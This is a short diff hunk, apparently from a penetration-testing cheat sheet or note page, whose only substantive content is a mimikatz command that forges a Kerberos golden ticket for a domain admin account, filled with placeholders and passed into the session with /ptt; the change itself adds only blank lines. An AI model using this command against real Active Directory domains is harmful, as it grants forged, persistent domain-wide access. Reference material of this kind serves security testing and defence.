@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:37:17.682651+00:00'
 ```bash
 .\mimikatz kerberos::golden /admin:ADMINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt
 ```
+
+
